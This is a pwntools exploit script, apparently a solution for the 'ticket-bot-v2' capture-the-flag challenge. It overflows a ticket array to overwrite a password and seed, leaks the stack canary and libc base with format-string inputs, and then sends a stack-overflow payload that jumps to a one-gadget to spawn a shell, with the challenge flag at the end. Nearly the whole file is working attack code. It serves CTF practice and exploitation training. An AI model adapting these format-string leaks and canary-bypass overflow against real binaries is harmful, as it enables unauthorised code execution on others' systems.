from pwn import *

bin = './chal'
elf = context.binary = ELF(bin)
libc = elf.libc

#p = process(bin)
#gdb.attach(p, 'b *adminpass+129\nb *adminpass+108')
p = remote('ticket-bot-v2.challs.csc.tf', 1337)
'''
5 Tickets allows you to write at 0x4040e0 which is the seed buffer, if we write 8 bytes we are overwriting the passowrd and the seed
Can also leak global variables with view ticket
'''

#Overwriting seed and password
p.sendlineafter(b'Please tell me why your here:', b'A')
for i in range(4):
    p.sendlineafter(b'========================', b'1')
    p.sendlineafter(b'Please tell me why your here:', b'A')

#Overwrite here
p.sendlineafter(b'========================', b'1')
p.sendlineafter(b'Please tell me why your here:', b'A'*8)

#Logging into admin panel
p.sendlineafter(b'========================', b'3')
p.sendlineafter(b'Admin Password', str(0x41414141).encode())

#Leaking canary
p.sendlineafter(b'========================', b'1')
p.sendlineafter(b'Enter new Password', b'%7$p')
p.recvuntil(b'Password changed to\n')
canary = int(p.recvuntil(b'=')[:-1], 16)
log.info(hex(canary))

#Leaking libc
p.sendlineafter(b'========================', b'3')
p.sendlineafter(b'Admin Password', str(0x41414141).encode())
p.sendlineafter(b'========================', b'1')
p.sendlineafter(b'Enter new Password', b'%3$p')

p.recvuntil(b'Password changed to\n')
libc.address = int(p.recvuntil(b'=')[:-1], 16) - 0x114887 + 0x65f0
log.info(hex(libc.address))

#Overflow time
p.sendlineafter(b'========================', b'3')
p.sendlineafter(b'Admin Password', str(0x41414141).encode())
p.sendlineafter(b'========================', b'1')

payload = b'A'*8 + p64(canary) + b'A'*8 + p64(libc.address + 0xe3b01) #lovely onegadget
p.sendlineafter(b'Enter new Password', payload)
p.interactive()
p.close()

#CSCTF{4rr4ys_4nd_th3re_1nd3x3s_h4ndl3_w1th_c4r3}